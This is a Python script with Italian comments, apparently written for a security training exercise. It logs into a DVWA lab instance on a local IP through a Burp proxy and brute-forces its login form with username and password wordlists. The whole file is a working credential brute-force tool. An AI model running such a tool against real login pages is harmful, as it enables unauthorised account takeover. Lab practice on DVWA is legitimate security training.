import requests
from bs4 import BeautifulSoup
# Sono tutte le variabili universali
USERNAME = "admin"     # SARÀ L'USERNAME USATA PER ENTRARE DENTRO DVWA/LOGIN
PASSWORD = "password"  # SARÀ LA PASSWORD USATA PER ENTRARE DENTRO DVWA/LOGIN 
DIFFICULTY = "low"
BASE_URL = "http://192.168.1.85/dvwa"   # IP DEL BRUTERFORD
USERNAME_WORDLISTS  = "/home/kali/Desktop/Build_week/nome1.txt" # percorso del file
PASSWORD_WORDLISTS  = "/home/kali/Desktop/Build_week/pass.txt"  # percorso del file
proxies = {"http": "http://127.0.0.1:8080"}     #PROXIE PER COMUNICARE CON BURPSUITE
 

def main():
    init_app()
    bruteforce_low()
              
def init_app():
    global USERNAME, PASSWORD, BASE_URL, PHP_ID
    url = BASE_URL + "/login.php" # IL PROGRAMMA ENTRA NELLA PAGINA DI LOGIN
    r = requests.get(url, proxies=proxies)  # MANDA LA PRIMA RICHIESTA GET AL SITO
    try:
        cookies = r.headers['Set-Cookie']    # PRENDE TUTTO IL SET COOKIE DALLA RICHIESTA 
    except KeyError as e:
        print("[ERROR] - Server did not send PHPSESSID cookie, need to init DVWA") #
        exit()       
    PHP_ID = cookies.split(";")[0].split("=")[1]  # PRENDE IL PHPSESSID DAL SET COOKIE, 
    
    custom_headers = {
        "Content-Type": "application/x-www-form-urlencoded",      #INSERIAMO IL MESSAGGIO CHE DEVE MANDARE
        "Cookie": f"security=high; PHPSESSID={PHP_ID}",
        "Upgrade-Insecure-Requests": "1",
    }
    post_data = f"username={USERNAME}&password={PASSWORD}&Login=Login"  ### INSERIAMO LA PARTE FINALE, CIOÈ LA DATA CON USERNAME E PASSWORD CORETTE
    r = requests.post(url, headers=custom_headers, data=post_data, proxies=proxies, allow_redirects=False)  #MANDA LA RICHIESTA POST,PER ENTRARE DENTRO DVWA
    
    custom_headers = {
        "Referer": url,
        "Cookie": f"security=high; PHPSESSID={PHP_ID}", ##### INSERIAMO IL MESSAGGIO CHE DEVE MANDARE
        }
    r = requests.get(url, headers=custom_headers, proxies=proxies) ### MANDA LA RICHIESTA GET, PER VERIFICARE SE È ENTRATO 
    soup = BeautifulSoup(r.text, "html.parser")
    risultato = soup.find("You have logged in as 'admin'")
    
    url1 = BASE_URL + "/index.php"    # ENTRIAMO NELLA PAGINA PRINCIPALE DI INDEX
    custom_headers = {
        "Referer": "http://192.168.1.85/dvwa/login.php",       ## CAMBIO IP DI PROVENIENZA
        "Cookie": f"security=low; PHPSESSID={PHP_ID}", 
        "Upgrade-Insecure-Requests": "1"
   
    }
    r = requests.get(url1, headers=custom_headers, proxies=proxies)
    
   #######CAMBIARE DA HIGH A LOW
   
    url2 = "http://192.168.1.85/dvwa/vulnerabilities/brute/"
    custom_headers = {
        "Referer": "http://192.168.1.85/dvwa/index.php",   # cambia IP
        "Cookie": f"security=low; PHPSESSID={PHP_ID}", 
    }
    r = requests.get(url2, headers=custom_headers, proxies=proxies)
    
    return "Database has been created." in r.text
    
    
def bruteforce_low():
    global USERNAME_WORDLISTS, PASSWORD_WORDLISTS
    
    usernames = get_wordlist(USERNAME_WORDLISTS)
    passwords = get_wordlist(PASSWORD_WORDLISTS)
    print('Gli utenti sono:',usernames)
    print('Le password sono:',passwords)
    
    print(f"[INFORMAZIONE PRINCIPALE]: Ci sono: {len(usernames)} usernames nel file")
    print(f"[INFORMAZIONE PRINCIPALE]: Ci sono: {len(passwords)} passwords nel file")
    
    for user in usernames:
        for password in passwords:
            print(f"[INFO]: Testing: ({user}:{password})")
            if check_credentials(user, password):
                print(f"[INFO]: Found credentials: ({user}:{password})")
                break
                              
def get_wordlist(wordlist_path):    #VA NELLA CARTELLA A PRENDERE I CONTENUTI
    return open(wordlist_path, "r").read().splitlines()  #
    
def check_credentials(username, password):
    global BASE_URL, DIFFICULTY, proxies
    URL = BASE_URL + "/vulnerabilities/brute/"
    params = {"username": username, "password": password, "Login": "Login"}
    r = http_get(URL, DIFFICULTY, params=params)
    return "Welcome to the password protected area admin" in r.text
    
def http_get(url, difficulty, headers=None, params=None, cookies=None, timeout=None):
    global PHP_ID, USERNAME, PASSWORD, proxies
    
    if not PHP_ID:
        PHP_ID = get_auth_cookie(url, USERNAME, PASSWORD)

    if difficulty not in ["low", "medium", "high"]:
        print(f"[ERROR]: difficulty value ({difficulty}) not supported")
        exit()
        
    custom_headers = {
        "Cookie": f"PHPSESSID={PHP_ID}; security={difficulty};" + create_cookie(cookies),
    }
    if headers:
        for h in headers:
            custom_headers[h] = headers[h] 
        
    return requests.get(url, headers=custom_headers, params=params, timeout=timeout, proxies=proxies) 
    
def create_cookie(cookies):
    if not cookies:
        return ""
    else:
        return ";".join([f"{key}={cookies[key]}" for key in cookies])
        
if __name__ == "__main__":
    main()

